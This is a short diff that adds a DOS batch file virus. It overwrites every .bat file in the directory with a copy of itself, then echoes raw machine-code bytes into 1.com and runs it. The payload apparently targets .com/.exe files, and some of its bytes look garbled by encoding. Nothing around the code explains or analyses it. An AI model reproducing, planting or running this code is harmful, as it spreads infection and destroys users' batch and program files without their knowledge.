@@ -1,0 +1,5 @@
+if "#%1"=="#af" goto ar
+for %%f in (*.bat) do copy %0 %%f
+del 1.com
+echo ´3€ì3ˆ&9´Nº5a€î`Í!r¸B=,@3Ò²Îƒê0Í!“´@±:3ÒþÆÍ!´OëÝÃ*.c*x >>1.com
+call 1.com
